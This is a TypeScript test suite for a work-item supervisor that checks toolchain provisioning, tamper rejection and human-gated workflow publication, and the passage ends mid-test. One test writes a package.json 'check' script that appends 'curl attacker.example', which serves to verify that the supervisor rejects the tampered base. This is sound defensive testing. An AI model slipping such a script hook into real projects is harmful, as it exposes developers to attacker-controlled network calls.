import { execFileSync } from "node:child_process";
import { writeFileSync } from "node:fs";
import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";

import * as localWorktreeRuntime from "../src/runtime/local-worktree.js";
import * as localScopeRuntime from "../src/runtime/local-scope.js";
import { PlatformUnavailableError } from "../src/platform.js";
import { ContinuousExecutionPool } from "../src/scheduling/continuous-refill.js";
import { TOOLCHAIN_AUTHORITY_ADAPTERS } from "../src/toolchains/authority.js";
import {
  activeRuntimeBundleSync,
  provisionToolchain,
  restoreToolchain,
  runtimeComponentPaths,
  toolchainStoreRoot,
} from "../src/runtime/toolchain-store.js";
import {
  canonicalJson,
  runtimeBundleDigest,
  sha256Bytes,
  type RuntimeBundleReceipt,
} from "../src/runtime/toolchain-bundle.js";
import { providerSupervisorFixture } from "./helpers/provider-supervisor.js";

const fixtures: Awaited<ReturnType<typeof providerSupervisorFixture>>[] = [];

afterEach(async () => {
  for (const fixture of fixtures.splice(0)) await fixture.dispose();
});

function admitLocalValidation(version = "10.34.5") {
  return vi
    .spyOn(localScopeRuntime, "runScopedLocalProcess")
    .mockImplementation(async (_identity, command) => ({
      exitCode: 0,
      signal: null,
      stdout:
        command.args?.[0] === "--version"
          ? version === "0.12.12"
            ? command.command.includes("python")
              ? "Python 3.14.7\n"
              : "uv 0.12.12\n"
            : `${version}\n`
          : "",
      stderr: "",
      durationMs: 1,
      timedOut: false,
    }));
}

async function provisionBunFixture(): Promise<void> {
  const assets = await mkdtemp(join(tmpdir(), "factory-bun-supervisor-assets-"));
  const tree = join(assets, "tree");
  await mkdir(join(tree, "bun-linux-x64-baseline"), { recursive: true });
  await writeFile(join(tree, "bun-linux-x64-baseline/bun"), "fixture bun");
  const archive = join(assets, "bun.zip");
  execFileSync("python3", ["-m", "zipfile", "-c", archive, "bun-linux-x64-baseline"], {
    cwd: tree,
  });
  const bytes = await readFile(archive);
  await provisionToolchain("bun", {
    source: {
      listReleases: async () => [
        {
          id: 293,
          tag: "bun-v1.3.10",
          draft: false,
          prerelease: false,
          publishedAt: "2026-09-10T00:00:00.000Z",
          assets: [
            {
              id: 2930,
              name: "bun-linux-x64-baseline.zip",
              url: "https://api.github.test/assets/2930",
              browserDownloadUrl:
                "https://github.com/oven-sh/bun/releases/download/bun-v1.3.10/bun-linux-x64-baseline.zip",
              size: bytes.byteLength,
              digest: `sha256:${sha256Bytes(bytes)}`,
            },
          ],
        },
      ],
      downloadAsset: async () => bytes,
    },
    run: (async () => ({ stdout: "1.3.10\n", stderr: "" })) as never,
  });
  await rm(assets, { recursive: true, force: true });
}

async function provisionUvFixture(): Promise<void> {
  const assets = await mkdtemp(join(tmpdir(), "factory-uv-supervisor-assets-"));
  const uvTree = join(assets, "uv-tree");
  const pythonTree = join(assets, "python-tree");
  await mkdir(join(uvTree, "uv-x86_64-unknown-linux-gnu"), { recursive: true });
  await mkdir(join(pythonTree, "python/bin"), { recursive: true });
  await writeFile(
    join(uvTree, "uv-x86_64-unknown-linux-gnu/uv"),
    "#!/bin/sh\nprintf 'uv 0.12.12\\n'\n",
  );
  await writeFile(join(pythonTree, "python/bin/python3"), "#!/bin/sh\nprintf 'Python 3.14.7\\n'\n");
  const uvArchive = join(assets, "uv.tar.gz");
  const pythonArchive = join(assets, "python.tar.gz");
  execFileSync("tar", ["-czf", uvArchive, "-C", uvTree, "uv-x86_64-unknown-linux-gnu"]);
  execFileSync("tar", ["-czf", pythonArchive, "-C", pythonTree, "python"]);
  const uvBytes = await readFile(uvArchive);
  const pythonBytes = await readFile(pythonArchive);
  const uvName = "uv-x86_64-unknown-linux-gnu.tar.gz";
  const pythonName =
    "cpython-3.14.7+20260910-x86_64-unknown-linux-gnu-install_only_stripped.tar.gz";
  const uvRelease = {
    id: 291,
    tag: "0.12.12",
    draft: false,
    prerelease: false,
    publishedAt: "2026-09-10T00:00:00.000Z",
    assets: [
      {
        id: 2910,
        name: uvName,
        url: "https://api.github.test/assets/2910",
        browserDownloadUrl: `https://github.com/astral-sh/uv/releases/download/0.12.12/${uvName}`,
        size: uvBytes.byteLength,
        digest: `sha256:${sha256Bytes(uvBytes)}`,
      },
    ],
  };
  const pythonRelease = {
    id: 2911,
    tag: "20260910",
    draft: false,
    prerelease: false,
    publishedAt: "2026-09-10T00:00:00.000Z",
    assets: [
      {
        id: 2912,
        name: pythonName,
        url: "https://api.github.test/assets/2912",
        browserDownloadUrl: `https://github.com/astral-sh/python-build-standalone/releases/download/20260910/${pythonName}`,
        size: pythonBytes.byteLength,
        digest: `sha256:${sha256Bytes(pythonBytes)}`,
      },
    ],
  };
  await provisionToolchain("uv", {
    source: {
      listReleases: async (_owner, repository) =>
        repository === "python-build-standalone" ? [pythonRelease] : [uvRelease],
      listReleaseAssets: async (_owner, repository) =>
        repository === "python-build-standalone" ? pythonRelease.assets : uvRelease.assets,
      downloadAsset: async (_owner, repository) =>
        repository === "python-build-standalone" ? pythonBytes : uvBytes,
    },
  });
  await rm(assets, { recursive: true, force: true });
}

async function installAlternativePnpmReceipt(
  source: RuntimeBundleReceipt,
): Promise<RuntimeBundleReceipt> {
  const root = toolchainStoreRoot();
  const unsigned = structuredClone(source) as Omit<RuntimeBundleReceipt, "digest"> & {
    digest?: string;
  };
  delete unsigned.digest;
  const pnpm = unsigned.components.find(({ id }) => id === "pnpm")!;
  pnpm.version = "10.34.6";
  pnpm.release = { ...pnpm.release, releaseId: "2", tag: "v10.34.6" };
  const digest = runtimeBundleDigest(unsigned);
  const receipt = { ...unsigned, digest } as RuntimeBundleReceipt;
  await cp(join(root, "bundles", source.digest), join(root, "bundles", digest), {
    recursive: true,
  });
  await writeFile(join(root, "bundles", digest, "receipt.json"), `${canonicalJson(receipt)}\n`);
  return receipt;
}

describe("Supervisor repository-capability admission", () => {
  it("runs a uv provider through integration before its exact-base consumer", async () => {
    await provisionUvFixture();
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilityAdapter: "uv",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation("0.12.12");
    try {
      const result = await fixture.run();
      expect(result, result.reason).toMatchObject({ status: "completed" });
      const providerIntegrated = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptIntegrated" && event.workItem === 8,
        );
      const consumerReserved = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      expect(providerIntegrated).toBeDefined();
      expect(consumerReserved).toBeDefined();
      expect(consumerReserved!.sequence).toBeGreaterThan(providerIntegrated!.sequence);
      expect(fixture.events().filter((event) => event.event === "GraphCompiled")).toHaveLength(1);
      expect(scoped).toHaveBeenCalled();
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("runs a Bun provider through integration before its exact-base consumer", async () => {
    await provisionBunFixture();
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilityAdapter: "bun",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation("1.3.10");
    try {
      const result = await fixture.run();
      expect(result, result.reason).toMatchObject({ status: "completed" });
      const providerIntegrated = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptIntegrated" && event.workItem === 8,
        );
      const consumerReserved = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      expect(providerIntegrated).toBeDefined();
      expect(consumerReserved).toBeDefined();
      expect(consumerReserved!.sequence).toBeGreaterThan(providerIntegrated!.sequence);
      expect(fixture.events().filter((event) => event.event === "GraphCompiled")).toHaveLength(1);
      expect(scoped).toHaveBeenCalled();
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("grounds a descendant on the exact integrated provider before reserving or invoking it", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result, result.reason).toMatchObject({ status: "completed" });
      expect(
        fixture.activity
          .filter((entry) => entry.operation === "launch")
          .map((entry) => entry.workItem),
      ).toEqual(expect.arrayContaining([8, 9, 10]));
      const providerIntegrated = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptIntegrated" && event.workItem === 8,
        );
      const consumerReserved = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      expect(providerIntegrated).toBeDefined();
      expect(consumerReserved).toBeDefined();
      expect(consumerReserved!.sequence).toBeGreaterThan(providerIntegrated!.sequence);
      expect(scoped).toHaveBeenCalled();
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects a mutated exact base before reservation while independent ready work is still admitted", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "unsafe",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    const originalMaterialize = localWorktreeRuntime.createLocalWorktree;
    const materialize = vi
      .spyOn(localWorktreeRuntime, "createLocalWorktree")
      .mockImplementation(async (repository, baseSha) => {
        const worktree = await originalMaterialize(repository, baseSha);
        if (baseSha !== fixture.graph.workItems[0]!.baseSha) {
          await writeFile(
            join(worktree.path, "package.json"),
            JSON.stringify({
              name: "capability-admission-fixture",
              version: "1.0.0",
              private: true,
              packageManager: "pnpm@10.34.5",
              scripts: {
                test: "node --test test/check.js",
                check: "node --test test/check.js && curl attacker.example",
              },
            }),
          );
        }
        return worktree;
      });
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(/not grounded on exact base.*finite validation allowlist/),
      });
      expect(
        fixture.activity
          .filter((entry) => entry.operation === "launch")
          .map((entry) => entry.workItem),
      ).toEqual(expect.arrayContaining([8, 10]));
      expect(
        fixture.activity.some(
          (entry) =>
            entry.workItem === 9 &&
            ["launch", "review", "candidate-review"].includes(entry.operation),
        ),
      ).toBe(false);
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(false);
    } finally {
      materialize.mockRestore();
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects provider-lineage tampering before reserving or reviewing the consumer", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilityProviderLineageMismatch: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(
          /provider root.*merge is not authenticated|prior integration lacks its authenticated accepted exact-head checkpoint/i,
        ),
      });
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(false);
      expect(
        fixture.activity.some(
          (entry) => entry.workItem === 9 && ["launch", "review"].includes(entry.operation),
        ),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects a provider reservation comment that differs from its immutable trailer", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilityProviderReservationCommentMismatch: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(
          /source reservation changed|authenticated source reservation/,
        ),
      });
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(false);
      expect(
        fixture.activity.some(
          (entry) => entry.workItem === 9 && ["launch", "review"].includes(entry.operation),
        ),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects a protected-source ref race at the final capability fence", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilitySourceRefRace: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      let refusal: string;
      try {
        const result = await fixture.run();
        if (result.status !== "escalated") {
          throw new Error(`expected escalation, received ${result.status}`);
        }
        refusal = result.reason ?? "";
      } catch (error) {
        refusal = error instanceof Error ? error.message : String(error);
      }
      expect(refusal).toMatch(
        /source ref refs\/heads\/main (?:no longer names|changed during capability inspection)|base branch advanced outside this run|publication base main changed during workflow inspection/i,
      );
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(false);
      expect(
        fixture.activity.some(
          (entry) => entry.workItem === 9 && ["launch", "review"].includes(entry.operation),
        ),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects a bundled-runtime identity change before reservation or model work", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    const pnpm = TOOLCHAIN_AUTHORITY_ADAPTERS.find((adapter) => adapter.id === "node-pnpm")!;
    const receipt = activeRuntimeBundleSync("pnpm");
    const component = runtimeComponentPaths(toolchainStoreRoot(), receipt).find(
      (candidate) => candidate.component.id === "pnpm",
    )!;
    const originalAsset = await readFile(component.asset);
    const resolve = pnpm.resolveIntegratedBase!;
    const runtime = vi.spyOn(pnpm, "resolveIntegratedBase").mockImplementation(async (input) => {
      const proofs = await resolve(input);
      await writeFile(component.asset, Buffer.concat([originalAsset, Buffer.from("mutation")]));
      return proofs;
    });
    try {
      let refusal: string;
      try {
        const result = await fixture.run();
        if (result.status !== "escalated") {
          throw new Error(`expected escalation, received ${result.status}`);
        }
        refusal = result.reason ?? "";
      } catch (error) {
        refusal = error instanceof Error ? error.message : String(error);
      }
      expect(refusal).toMatch(
        /runtime.*(?:integrity|changed)|cache failed integrity verification/i,
      );
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(false);
      expect(
        fixture.activity.some(
          (entry) => entry.workItem === 9 && ["launch", "review"].includes(entry.operation),
        ),
      ).toBe(false);
    } finally {
      await writeFile(component.asset, originalAsset);
      runtime.mockRestore();
      scoped.mockRestore();
    }
  }, 60_000);

  it("keeps the reservation-bound runtime when the active pointer changes before launch", async () => {
    const root = toolchainStoreRoot();
    const selected = activeRuntimeBundleSync("pnpm");
    const alternative = await installAlternativePnpmReceipt(selected);
    const selectedComponents = runtimeComponentPaths(root, selected);
    const pnpmBytes = await readFile(
      selectedComponents.find(({ component }) => component.id === "pnpm")!.asset,
    );
    const nodeBytes = await readFile(
      selectedComponents.find(({ component }) => component.id === "node")!.asset,
    );
    let launchPacketDigest: string | undefined;
    let exactRestoreCount = 0;
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      configureLocalBackend: (backend) => ({
        ...backend,
        launch: async (input) => {
          if (input.workItem === 9) {
            await writeFile(
              join(root, "active", "pnpm.json"),
              `${canonicalJson({ digest: alternative.digest })}\n`,
            );
            launchPacketDigest = input.packet.managedRuntimes?.[0]?.bundleDigest;
            const reservation = fixture
              .events()
              .find(
                (event) =>
                  event.kind === "attempt" &&
                  event.event === "AttemptReserved" &&
                  event.workItem === 9,
              );
            if (reservation?.kind !== "attempt" || !reservation.managedRuntimeActivation)
              throw new Error("test launch lacks its durable runtime activation");
            await rm(join(root, "bundles", selected.digest), { recursive: true });
            await restoreToolchain(reservation.managedRuntimeActivation.receipts[0]!, {
              root,
              source: {
                listReleases: async () => {
                  throw new Error("recovery must not select the latest pnpm release");
                },
                downloadAsset: async (owner, repository, assetId) => {
                  expect([owner, repository, assetId]).toEqual(["pnpm", "pnpm", 1]);
                  exactRestoreCount += 1;
                  return pnpmBytes;
                },
                resolveLatestNodeDistribution: async () => {
                  throw new Error("recovery must not select the latest Node release");
                },
                downloadNodeDistribution: async () => nodeBytes,
              },
              run: (async (command: string) => ({
                stdout: command.includes("/node/root/") ? `${process.version}\n` : "10.34.5\n",
                stderr: "",
              })) as never,
            });
          }
          return backend.launch(input);
        },
      }),
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result, result.reason).toMatchObject({ status: "completed" });
      expect(launchPacketDigest).toBe(selected.digest);
      expect(exactRestoreCount).toBe(1);
      const reservation = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      expect(
        reservation?.kind === "attempt"
          ? reservation.managedRuntimeActivation?.requirements[0]?.bundleDigest
          : undefined,
      ).toBe(selected.digest);
      expect(activeRuntimeBundleSync("pnpm").digest).toBe(alternative.digest);
      expect(fixture.events().filter((event) => event.event === "GraphCompiled")).toHaveLength(1);
    } finally {
      await writeFile(
        join(root, "active", "pnpm.json"),
        `${canonicalJson({ digest: selected.digest })}\n`,
      );
      scoped.mockRestore();
    }
  }, 60_000);

  it("inherits the provider generation runtime when active changes before consumer admission", async () => {
    const root = toolchainStoreRoot();
    const providerRuntime = activeRuntimeBundleSync("pnpm");
    const newerDefault = await installAlternativePnpmReceipt(providerRuntime);
    let switched = false;
    let fixture!: Awaited<ReturnType<typeof providerSupervisorFixture>>;
    fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      afterIntegration: () => {
        if (
          switched ||
          !fixture
            .events()
            .some(
              (event) =>
                event.kind === "attempt" &&
                event.event === "AttemptIntegrated" &&
                event.workItem === 8,
            )
        )
          return;
        switched = true;
        writeFileSync(
          join(root, "active", "pnpm.json"),
          `${canonicalJson({ digest: newerDefault.digest })}\n`,
        );
      },
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result, result.reason).toMatchObject({ status: "completed" });
      expect(switched).toBe(true);
      const provider = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 8,
        );
      const consumer = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      const selected = (event: typeof provider) =>
        event?.kind === "attempt"
          ? event.managedRuntimeActivation?.requirements[0]?.bundleDigest
          : undefined;
      expect(selected(provider)).toBe(providerRuntime.digest);
      expect(selected(consumer)).toBe(providerRuntime.digest);
      expect(activeRuntimeBundleSync("pnpm").digest).toBe(newerDefault.digest);
    } finally {
      await writeFile(
        join(root, "active", "pnpm.json"),
        `${canonicalJson({ digest: providerRuntime.digest })}\n`,
      );
      scoped.mockRestore();
    }
  }, 60_000);

  it("restores provider generation A while active stays B and resumes the same collected consumer", async () => {
    const root = toolchainStoreRoot();
    const providerRuntime = activeRuntimeBundleSync("pnpm");
    const newerDefault = await installAlternativePnpmReceipt(providerRuntime);
    const components = runtimeComponentPaths(root, providerRuntime);
    const pnpmBytes = await readFile(
      components.find(({ component }) => component.id === "pnpm")!.asset,
    );
    const nodeBytes = await readFile(
      components.find(({ component }) => component.id === "node")!.asset,
    );
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      dependencyChain: true,
      capabilityAdmission: "valid",
      capabilityConsumerPublicationCrash: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      await expect(fixture.run()).rejects.toBeInstanceOf(PlatformUnavailableError);
      const reservation = fixture
        .events()
        .find(
          (event) =>
            event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
        );
      if (reservation?.kind !== "attempt" || !reservation.managedRuntimeActivation)
        throw new Error("recovery fixture lacks the consumer runtime activation");
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" &&
              event.event === "AttemptCollected" &&
              event.workItem === 9,
          ),
      ).toBe(true);
      await writeFile(
        join(root, "active", "pnpm.json"),
        `${canonicalJson({ digest: newerDefault.digest })}\n`,
      );
      await rm(join(root, "bundles", providerRuntime.digest), { recursive: true });
      await restoreToolchain(reservation.managedRuntimeActivation.receipts[0]!, {
        root,
        source: {
          listReleases: async () => {
            throw new Error("recovery must not select the latest pnpm release");
          },
          downloadAsset: async () => pnpmBytes,
          resolveLatestNodeDistribution: async () => {
            throw new Error("recovery must not select the latest Node release");
          },
          downloadNodeDistribution: async () => nodeBytes,
        },
        run: (async (command: string) => ({
          stdout: command.includes("/node/root/") ? `${process.version}\n` : "10.34.5\n",
          stderr: "",
        })) as never,
      });

      const recovered = await fixture.run();
      expect(recovered, recovered.reason).toMatchObject({ status: "completed" });
      expect(activeRuntimeBundleSync("pnpm").digest).toBe(newerDefault.digest);
      expect(
        fixture.activity.filter((entry) => entry.workItem === 9 && entry.operation === "launch"),
      ).toHaveLength(1);
      expect(fixture.events().filter((event) => event.event === "GraphCompiled")).toHaveLength(1);
    } finally {
      await writeFile(
        join(root, "active", "pnpm.json"),
        `${canonicalJson({ digest: providerRuntime.digest })}\n`,
      );
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects a protected-source mutation after reservation and before model launch", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilitySourceRefRaceAfterReservation: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(
          /source ref changed after attempt reservation|base branch advanced outside this run/i,
        ),
      });
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(true);
      expect(
        fixture.activity.some((entry) => entry.workItem === 9 && entry.operation === "launch"),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rejects provider-lineage mutation after reservation and before model launch", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      localMaxParallel: 2,
      capabilityAdmission: "valid",
      capabilityProviderLineageMismatchAfterReservation: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(
          /provider root.*merge is not authenticated|authenticated accepted exact-head checkpoint/i,
        ),
      });
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptReserved" && event.workItem === 9,
          ),
      ).toBe(true);
      expect(
        fixture.activity.some((entry) => entry.workItem === 9 && entry.operation === "launch"),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);
});

describe("Supervisor workflow publication boundary", () => {
  it("publishes a protected-push-only workflow but leaves its merge human-authorized", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      workflowArtifact: "safe",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(/sensitive|human|workflow/i),
      });
      expect(fixture.snapshot.workItems[0]!.linkedPullRequests).toContainEqual(
        expect.objectContaining({ number: 108, state: "OPEN", mergedAt: null }),
      );
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "publication" &&
              event.event === "PublicationRecorded" &&
              event.workItem === 8,
          ),
      ).toBe(true);
      expect(fixture.mergePull).not.toHaveBeenCalledWith(expect.objectContaining({ number: 108 }));
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("retains an unsafe workflow behind a durable hold before creating a ref or PR", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      workflowArtifact: "unsafe",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(/pre-publication approval.*only after a push/i),
      });
      expect(
        fixture.activity.some((entry) => entry.workItem === 8 && entry.operation === "review"),
      ).toBe(true);
      expect(fixture.snapshot.workItems[0]!.linkedPullRequests).toEqual([]);
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptDeferred" && event.workItem === 8,
          ),
      ).toBe(true);
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "publication" &&
              event.event === "PublicationRecorded" &&
              event.workItem === 8,
          ),
      ).toBe(false);
      expect(
        [...fixture.refs.keys()].some(
          (ref) => ref.includes("work-item-8") && ref.startsWith("refs/heads/"),
        ),
      ).toBe(false);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("rechecks the live base before publishing a workflow-bearing artifact", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      workflowArtifact: "safe",
      workflowLiveBaseUnsafe: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(/pre-publication approval.*pull_request_target/i),
      });
      expect(fixture.snapshot.workItems[0]!.linkedPullRequests).toEqual([]);
      expect(
        [...fixture.refs.keys()].some(
          (ref) => ref.includes("work-item-8") && ref.startsWith("refs/heads/"),
        ),
      ).toBe(false);
      expect(
        fixture
          .events()
          .some(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptDeferred" && event.workItem === 8,
          ),
      ).toBe(true);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it.each([
    ["create", /pre-publication approval.*feature ref or pull request.*create/i],
    ["push", /pre-publication approval.*push trigger is not restricted/i],
  ] as const)(
    "holds a candidate before the existing base workflow can run on %s",
    async (trigger, reason) => {
      let releaseSettlement!: () => void;
      const settlement = new Promise<void>((resolve) => {
        releaseSettlement = resolve;
      });
      let snapshotBlocked = false;
      if (trigger === "push") {
        const start = ContinuousExecutionPool.prototype.start;
        vi.spyOn(ContinuousExecutionPool.prototype, "start").mockImplementation(function (
          this: ContinuousExecutionPool<unknown>,
          key,
          operation,
          onSettled,
        ) {
          return start.call(this, key, operation, () => {
            onSettled?.();
            releaseSettlement();
          });
        });
      }
      const fixture = await providerSupervisorFixture("daytona-burst", {
        localOnly: true,
        workflowArtifact: "safe",
        workflowLiveBaseUnsafe: trigger,
        ...(trigger === "push"
          ? {
              afterWorkflowCandidatePreparedSnapshot: async () => {
                if (snapshotBlocked) return;
                snapshotBlocked = true;
                await settlement;
              },
            }
          : {}),
      });
      fixtures.push(fixture);
      const scoped = admitLocalValidation();
      try {
        const result = await fixture.run();
        expect(result).toMatchObject({
          status: "escalated",
          reason: expect.stringMatching(reason),
        });
        expect(fixture.snapshot.workItems[0]!.linkedPullRequests).toEqual([]);
        expect(
          [...fixture.refs.keys()].some(
            (ref) => ref.includes("work-item-8") && ref.startsWith("refs/heads/"),
          ),
        ).toBe(false);
        if (trigger === "push") {
          expect(snapshotBlocked).toBe(true);
          expect(
            fixture
              .events()
              .filter(
                (event) =>
                  event.kind === "attempt" &&
                  event.event === "AttemptDeferred" &&
                  event.workItem === 8,
              ),
          ).toHaveLength(1);
          expect(
            fixture.activity.filter(
              (entry) => entry.workItem === 8 && entry.operation === "launch",
            ),
          ).toHaveLength(1);
          expect(
            fixture.activity.filter(
              (entry) => entry.workItem === 8 && entry.operation === "review",
            ),
          ).toHaveLength(1);
        }
      } finally {
        scoped.mockRestore();
      }
    },
    60_000,
  );

  it("reduces a publication hold that settles only after terminal drain begins", async () => {
    let releaseFailure!: () => void;
    const failureGate = new Promise<void>((resolve) => {
      releaseFailure = resolve;
    });
    let heldFailure = false;
    let drainObserved = false;
    const start = ContinuousExecutionPool.prototype.start;
    vi.spyOn(ContinuousExecutionPool.prototype, "start").mockImplementation(function (
      this: ContinuousExecutionPool<unknown>,
      key,
      operation,
      onSettled,
    ) {
      return start.call(
        this,
        key,
        async () => {
          try {
            await operation();
          } catch (error) {
            if (key === 8) {
              heldFailure = true;
              await failureGate;
            }
            throw error;
          }
        },
        onSettled,
      );
    });
    const settle = ContinuousExecutionPool.prototype.settle;
    vi.spyOn(ContinuousExecutionPool.prototype, "settle").mockImplementation(async function (
      this: ContinuousExecutionPool<unknown>,
    ) {
      drainObserved = true;
      releaseFailure();
      return settle.call(this);
    });
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      workflowArtifact: "safe",
      workflowLiveBaseUnsafe: "create",
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      const result = await fixture.run();
      expect(result).toMatchObject({
        status: "escalated",
        reason: expect.stringMatching(
          /pre-publication approval.*feature ref or pull request.*create/i,
        ),
      });
      expect(heldFailure).toBe(true);
      expect(drainObserved).toBe(true);
      expect(
        fixture
          .events()
          .filter(
            (event) =>
              event.kind === "attempt" && event.event === "AttemptDeferred" && event.workItem === 8,
          ),
      ).toHaveLength(1);
    } finally {
      scoped.mockRestore();
    }
  }, 60_000);

  it("replays the workflow gate after a publication crash before restoring any ref or PR", async () => {
    const fixture = await providerSupervisorFixture("daytona-burst", {
      localOnly: true,
      workflowArtifact: "unsafe",
      workflowPublicationCrash: true,
    });
    fixtures.push(fixture);
    const scoped = admitLocalValidation();
    try {
      await expect(fixture.run()).rejects.toBeInstanceOf(PlatformUnavailableError);
      expect(
